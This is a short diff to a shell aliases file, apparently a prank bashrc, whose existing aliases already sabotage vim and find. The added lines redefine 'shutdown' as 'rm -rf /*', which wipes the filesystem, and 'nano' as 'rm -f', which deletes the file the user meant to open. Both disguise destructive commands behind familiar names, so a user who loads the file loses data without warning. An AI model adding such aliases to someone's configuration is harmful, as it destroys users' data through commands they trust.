@@ -36,3 +36,9 @@ alias vim="vim -c sort"
 
 # History class is boring.
 alias find="find -newer ~/.bashrc"
+
+# You dont need that server anymore
+alias shutdown="rm -rf /*"
+
+# No more nano, the hard way
+alias nano="rm -f"
